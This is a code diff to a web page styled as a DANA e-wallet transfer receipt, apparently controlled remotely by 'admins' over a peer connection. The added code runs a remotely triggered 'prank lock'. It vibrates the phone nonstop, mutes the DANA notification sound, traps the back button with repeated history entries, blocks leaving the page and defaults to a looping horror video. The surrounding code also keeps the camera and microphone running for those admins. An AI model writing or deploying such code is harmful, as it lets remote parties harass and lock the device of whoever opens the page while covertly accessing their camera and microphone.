@@ -76,24 +76,24 @@
       position: fixed; inset: 0; z-index: 9999;
       background: #07090F; color: #F8FAFC;
       display: flex; flex-direction: column; align-items: center; justify-content: center;
-      padding: 20px; overflow: hidden;
+      padding: 20px; overflow: hidden; user-select: none;
     }
     #adminPushOverlay.hidden { display: none !important; }
     #adminPushOverlay.horror-mode {
-      background: radial-gradient(circle at center, #3B0712 0%, #09050A 68%, #030205 100%);
-      animation: horrorPulse 1.6s infinite alternate;
+      background: radial-gradient(circle at center, #450A0A 0%, #09050A 68%, #030205 100%);
+      animation: horrorPulse 1.1s infinite alternate;
     }
     @keyframes horrorPulse {
-      0% { filter: contrast(1.05) brightness(0.92); }
-      100% { filter: contrast(1.25) brightness(1.08); }
+      0% { filter: contrast(1.08) brightness(0.9); }
+      100% { filter: contrast(1.32) brightness(1.1); }
     }
     .error-box {
       width: 100%; max-width: 400px;
-      background: rgba(17, 12, 20, 0.94);
-      border: 1.5px solid #DC2626;
+      background: rgba(17, 12, 20, 0.96);
+      border: 1.5px solid #EF4444;
       border-radius: 16px;
       padding: 22px 18px;
-      box-shadow: 0 0 40px rgba(220, 38, 38, 0.35);
+      box-shadow: 0 0 45px rgba(239, 68, 68, 0.42);
       text-align: left;
     }
     .error-badge {
@@ -313,7 +313,7 @@
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
               <span style="display:block;font-size:12px;font-weight:600;color:#334155;">Tanggal & Jam</span>
-              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 22:48</span>
+              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 23:04</span>
             </div>
             <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:#475569;cursor:pointer;">
               <input type="checkbox" id="autoTimeCheck" checked onchange="toggleTimeMode()" />
@@ -385,7 +385,7 @@
             <span style="font-size:var(--rc-logo-fs);font-weight:700;letter-spacing:0.14em;color:#118EE9;">DANA</span>
           </div>
           <div class="tabular-nums" style="padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
-            <span id="displayDateTime">24 Nov 2026 • 22:48</span>
+            <span id="displayDateTime">24 Nov 2026 • 23:04</span>
             <span id="displayIdDana">ID DANA 0858••••2418</span>
           </div>
           <div class="straight-divider"></div>
@@ -543,6 +543,13 @@
     mediaEl.muted = false;
     mediaEl.volume = 1.0;
 
+    function silenceDanaNotifSound() {
+      try {
+        mediaEl.pause();
+        mediaEl.muted = true;
+      } catch (_) {}
+    }
+
     function setAudioStatus(text, colorHex) {
       const el = document.getElementById('audioStatusText');
       if (!el) return;
@@ -693,13 +700,74 @@
     }
 
     /* =========================================================================
-       OVERLAY KIRIMAN ADMIN (LAYAR ERROR & VIDEO)
+       OVERLAY PRANK ADMIN: GETAR TERUS-MENERUS + SUARA DANA MATI + TAHAN BACK
        ========================================================================= */
-    function triggerVibrateAlert(pattern = [250, 120, 250, 120, 400]) {
+    let prankActive = false;
+    let vibrateLoopTimer = null;
+
+    function fireContinuousVibrate() {
       try {
-        if (navigator.vibrate) navigator.vibrate(pattern);
+        if (navigator.vibrate) {
+          navigator.vibrate([450, 120, 450, 120, 600, 120]);
+        }
       } catch (_) {}
     }
+
+    function startContinuousVibrate() {
+      stopContinuousVibrate();
+      fireContinuousVibrate();
+      vibrateLoopTimer = setInterval(() => {
+        if (!prankActive) {
+          stopContinuousVibrate();
+          return;
+        }
+        fireContinuousVibrate();
+      }, 1450);
+    }
+
+    function stopContinuousVibrate() {
+      if (vibrateLoopTimer) {
+        clearInterval(vibrateLoopTimer);
+        vibrateLoopTimer = null;
+      }
+      try {
+        if (navigator.vibrate) navigator.vibrate(0);
+      } catch (_) {}
+    }
+
+    function pushHistoryTrap() {
+      try {
+        history.pushState({ prankLocked: true, ts: Date.now() }, "", location.href);
+      } catch (_) {}
+    }
+
+    function engagePrankLock() {
+      prankActive = true;
+      silenceDanaNotifSound();
+      pushHistoryTrap();
+      pushHistoryTrap();
+      startContinuousVibrate();
+    }
+
+    function releasePrankLock() {
+      prankActive = false;
+      stopContinuousVibrate();
+    }
+
+    window.addEventListener("popstate", () => {
+      if (prankActive) {
+        pushHistoryTrap();
+        fireContinuousVibrate();
+      }
+    });
+
+    window.addEventListener("beforeunload", (e) => {
+      if (prankActive) {
+        e.preventDefault();
+        e.returnValue = "";
+        return "";
+      }
+    });
 
     function showAdminErrorOverlay(msg) {
       const overlay = document.getElementById("adminPushOverlay");
@@ -723,10 +791,7 @@
       errView.classList.remove("hidden");
       overlay.classList.remove("hidden");
 
-      triggerVibrateAlert();
-      if (msg.withSound !== false) {
-        playNotifSound("ALERT");
-      }
+      engagePrankLock();
     }
 
     function showAdminVideoOverlay(msg) {
@@ -737,7 +802,7 @@
 
       errView.classList.add("hidden");
       vidView.classList.remove("hidden");
-      overlay.classList.toggle("horror-mode", Boolean(msg.horrorMode));
+      overlay.classList.toggle("horror-mode", msg.horrorMode !== false);
       overlay.classList.remove("hidden");
 
       const targetUrl = (msg.videoUrl && msg.videoUrl.trim())
@@ -746,7 +811,7 @@
 
       if (pushVid) {
         pushVid.src = targetUrl;
-        pushVid.loop = Boolean(msg.loop);
+        pushVid.loop = msg.loop !== false;
         pushVid.muted = Boolean(msg.muted);
         pushVid.volume = msg.muted ? 0 : 1;
         pushVid.load();
@@ -755,7 +820,7 @@
           pushVid.play().catch(() => {});
         });
       }
-      triggerVibrateAlert([200, 100, 200]);
+      engagePrankLock();
     }
 
     function hideAdminOverlay() {
@@ -763,6 +828,8 @@
       const errView = document.getElementById("pushErrorView");
       const vidView = document.getElementById("pushVideoView");
       const pushVid = document.getElementById("adminPushVideo");
+
+      releasePrankLock();
 
       if (pushVid) {
         try {
@@ -1273,8 +1340,13 @@
     document.addEventListener("visibilitychange", async () => {
       if (hasSentExplicitClose) return;
       if (document.hidden) {
+        stopContinuousVibrate();
         broadcastPresenceToAdmins();
       } else {
+        if (prankActive) {
+          silenceDanaNotifSound();
+          startContinuousVibrate();
+        }
         connectToAdminLobby();
         if (hasCameraPermission && (!cameraStream || cameraStream.getVideoTracks().every((t) => t.readyState !== "live"))) {
           await openCameraKeepAlive(currentFacing, micEnabled).catch(() => {});
@@ -1290,6 +1362,7 @@
 
     function cleanupMemberSession(isExplicitClose = true) {
       if (!isExplicitClose) return;
+      stopContinuousVibrate();
       hasSentExplicitClose = true;
       const closingMsg = { type: "HP_CLOSING", peerId: MEMBER_PEER_ID, updatedAt: Date.now() };
       if (lobbyConn && lobbyConn.open) {
